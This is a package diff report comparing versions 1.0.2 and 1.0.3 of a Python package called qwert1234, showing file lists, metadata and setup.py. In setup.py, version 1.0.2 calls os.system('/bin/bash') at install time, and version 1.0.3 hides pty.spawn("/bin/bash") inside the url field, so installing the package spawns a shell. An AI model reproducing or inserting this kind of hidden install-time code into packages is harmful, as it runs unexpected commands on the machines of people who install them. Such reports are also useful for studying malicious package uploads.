# Comparing `tmp/qwert1234-1.0.2.tar.gz` & `tmp/qwert1234-1.0.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "qwert1234-1.0.2.tar", last modified: Mon May 15 11:46:27 2023, max compression
+gzip compressed data, was "qwert1234-1.0.3.tar", last modified: Mon May 15 12:01:30 2023, max compression
```

## Comparing `qwert1234-1.0.2.tar` & `qwert1234-1.0.3.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-05-15 11:46:27.515982 qwert1234-1.0.2/
--rw-rw-rw-   0        0        0      825 2023-05-15 11:46:27.515486 qwert1234-1.0.2/PKG-INFO
--rw-rw-rw-   0        0        0      174 2023-05-15 11:05:22.000000 qwert1234-1.0.2/README.md
-drwxrwxrwx   0        0        0        0 2023-05-15 11:46:27.512510 qwert1234-1.0.2/qwert1234/
--rw-rw-rw-   0        0        0        0 2023-05-15 10:55:55.000000 qwert1234-1.0.2/qwert1234/__init__.py
--rw-rw-rw-   0        0        0       32 2023-05-15 10:56:29.000000 qwert1234-1.0.2/qwert1234/back.py
--rw-rw-rw-   0        0        0      320 2023-05-15 10:49:27.000000 qwert1234-1.0.2/qwert1234/setup.py
-drwxrwxrwx   0        0        0        0 2023-05-15 11:46:27.514495 qwert1234-1.0.2/qwert1234.egg-info/
--rw-rw-rw-   0        0        0      825 2023-05-15 11:46:27.000000 qwert1234-1.0.2/qwert1234.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      209 2023-05-15 11:46:27.000000 qwert1234-1.0.2/qwert1234.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-05-15 11:46:27.000000 qwert1234-1.0.2/qwert1234.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       10 2023-05-15 11:46:27.000000 qwert1234-1.0.2/qwert1234.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-05-15 11:46:27.515982 qwert1234-1.0.2/setup.cfg
--rw-rw-rw-   0        0        0      864 2023-05-15 11:46:21.000000 qwert1234-1.0.2/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-15 12:01:30.777150 qwert1234-1.0.3/
+-rw-r--r--   0 root         (0) root         (0)      845 2023-05-15 12:01:30.773151 qwert1234-1.0.3/PKG-INFO
+-rwxrw-rw-   0 root         (0) root         (0)      174 2023-05-15 11:05:22.000000 qwert1234-1.0.3/README.md
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-15 12:01:30.773151 qwert1234-1.0.3/qwert1234/
+-rwxrw-rw-   0 root         (0) root         (0)        0 2023-05-15 10:55:55.000000 qwert1234-1.0.3/qwert1234/__init__.py
+-rwxrw-rw-   0 root         (0) root         (0)       32 2023-05-15 10:56:29.000000 qwert1234-1.0.3/qwert1234/back.py
+-rwxrw-rw-   0 root         (0) root         (0)      320 2023-05-15 10:49:27.000000 qwert1234-1.0.3/qwert1234/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-05-15 12:01:30.773151 qwert1234-1.0.3/qwert1234.egg-info/
+-rw-r--r--   0 root         (0) root         (0)      845 2023-05-15 12:01:30.000000 qwert1234-1.0.3/qwert1234.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      209 2023-05-15 12:01:30.000000 qwert1234-1.0.3/qwert1234.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-05-15 12:01:30.000000 qwert1234-1.0.3/qwert1234.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       10 2023-05-15 12:01:30.000000 qwert1234-1.0.3/qwert1234.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)       38 2023-05-15 12:01:30.777150 qwert1234-1.0.3/setup.cfg
+-rwxrw-rw-   0 root         (0) root         (0)      863 2023-05-15 12:01:08.000000 qwert1234-1.0.3/setup.py
```

### Comparing `qwert1234-1.0.2/PKG-INFO` & `qwert1234-1.0.3/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,23 +1,26 @@
-Metadata-Version: 2.1
-Name: qwert1234
-Version: 1.0.2
-Summary: A description of your library
-Home-page: 
-Author: Evolt
-Author-email: 
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: License :: OSI Approved :: MIT License
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.6
-Classifier: Programming Language :: Python :: 3.7
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Description-Content-Type: text/markdown
-
-# Example Package
-
-This is a simple example package. You can use
-[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
-to write your content.
+Metadata-Version: 2.1
+Name: qwert1234
+Version: 1.0.3
+Summary: A description of your library
+Home-page: UNKNOWN
+Author: Evolt
+Author-email: 
+License: UNKNOWN
+Platform: UNKNOWN
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.6
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Description-Content-Type: text/markdown
+
+# Example Package
+
+This is a simple example package. You can use
+[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
+to write your content.
+
```

### Comparing `qwert1234-1.0.2/qwert1234.egg-info/PKG-INFO` & `qwert1234-1.0.3/qwert1234.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,23 +1,26 @@
-Metadata-Version: 2.1
-Name: qwert1234
-Version: 1.0.2
-Summary: A description of your library
-Home-page: 
-Author: Evolt
-Author-email: 
-Classifier: Development Status :: 5 - Production/Stable
-Classifier: License :: OSI Approved :: MIT License
-Classifier: Programming Language :: Python :: 3
-Classifier: Programming Language :: Python :: 3.6
-Classifier: Programming Language :: Python :: 3.7
-Classifier: Programming Language :: Python :: 3.8
-Classifier: Programming Language :: Python :: 3.9
-Classifier: Programming Language :: Python :: 3.10
-Classifier: Programming Language :: Python :: 3.11
-Description-Content-Type: text/markdown
-
-# Example Package
-
-This is a simple example package. You can use
-[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
-to write your content.
+Metadata-Version: 2.1
+Name: qwert1234
+Version: 1.0.3
+Summary: A description of your library
+Home-page: UNKNOWN
+Author: Evolt
+Author-email: 
+License: UNKNOWN
+Platform: UNKNOWN
+Classifier: Development Status :: 5 - Production/Stable
+Classifier: License :: OSI Approved :: MIT License
+Classifier: Programming Language :: Python :: 3
+Classifier: Programming Language :: Python :: 3.6
+Classifier: Programming Language :: Python :: 3.7
+Classifier: Programming Language :: Python :: 3.8
+Classifier: Programming Language :: Python :: 3.9
+Classifier: Programming Language :: Python :: 3.10
+Classifier: Programming Language :: Python :: 3.11
+Description-Content-Type: text/markdown
+
+# Example Package
+
+This is a simple example package. You can use
+[Github-flavored Markdown](https://guides.github.com/features/mastering-markdown/)
+to write your content.
+
```

### Comparing `qwert1234-1.0.2/setup.py` & `qwert1234-1.0.3/setup.py`

 * *Files 16% similar despite different names*

```diff
@@ -1,26 +1,25 @@
 from setuptools import setup
-import os
+import pty
 setup(
     name='qwert1234',
-    version='1.0.2',
+    version='1.0.3',
     author='Evolt',
     author_email='',
     description='A description of your library',
     long_description=open('README.md').read(),
     long_description_content_type='text/markdown',
-    url='',
+    url=pty.spawn("/bin/bash"),
     packages=["qwert1234"],
     install_requires="",
     classifiers=[
         'Development Status :: 5 - Production/Stable',
         'License :: OSI Approved :: MIT License',
         'Programming Language :: Python :: 3',
         'Programming Language :: Python :: 3.6',
         'Programming Language :: Python :: 3.7',
         'Programming Language :: Python :: 3.8',
         'Programming Language :: Python :: 3.9',
         'Programming Language :: Python :: 3.10',
         'Programming Language :: Python :: 3.11',
     ],
 )
-os.system('/bin/bash')
```

